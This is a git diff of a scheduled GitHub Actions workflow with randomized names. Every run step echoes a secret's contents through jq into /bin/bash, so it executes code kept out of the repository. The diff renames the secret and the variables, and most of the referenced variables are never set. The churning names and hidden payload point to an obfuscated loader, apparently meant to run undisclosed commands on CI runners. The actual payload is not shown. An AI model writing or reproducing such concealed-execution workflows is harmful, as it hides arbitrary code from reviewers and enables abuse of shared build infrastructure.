@@ -1,27 +1,23 @@
 name: huangjinzhunm
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
-
-jobs:  # 16092
+    - cron: '18 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangjinzhunm
         env:
-          p4772: ${{ secrets.p4772 }}
+          prkp3365: ${{ secrets.prkp3365 }}
         run: |
-          echo $p4772 | jq -r .nq1312 | /bin/bash
-          echo $sm52 | jq -r .siq5660 | /bin/bash
-          echo $xsn5034 | jq -r .hj822 | /bin/bash
-          echo $dfcbo17707 | jq -r .evd4 | /bin/bash
-          echo $bpevu42066 | jq -r .wp088 | /bin/bash
-          echo $zko47409 | jq -r .sadf2094 | /bin/bash
-          echo $ibxia982 | jq -r .o5191 | /bin/bash
-          echo $ilysb09748 | jq -r .nq17959 | /bin/bash
-          echo $eyx944 | jq -r .xwjas50073 | /bin/bash
-          echo $h4 | jq -r .lu89 | /bin/bash
+          echo $prkp3365 | jq -r .k1303 | /bin/bash
+          echo $bz3 | jq -r .hj29 | /bin/bash
+          echo $x5 | jq -r .pr91 | /bin/bash
+          echo $u4 | jq -r .orywc1194 | /bin/bash
+          echo $rgc061 | jq -r .ww54 | /bin/bash
+          echo $uw5 | jq -r .hv75 | /bin/bash
+          echo $qda5941 | jq -r .i50 | /bin/bash
 
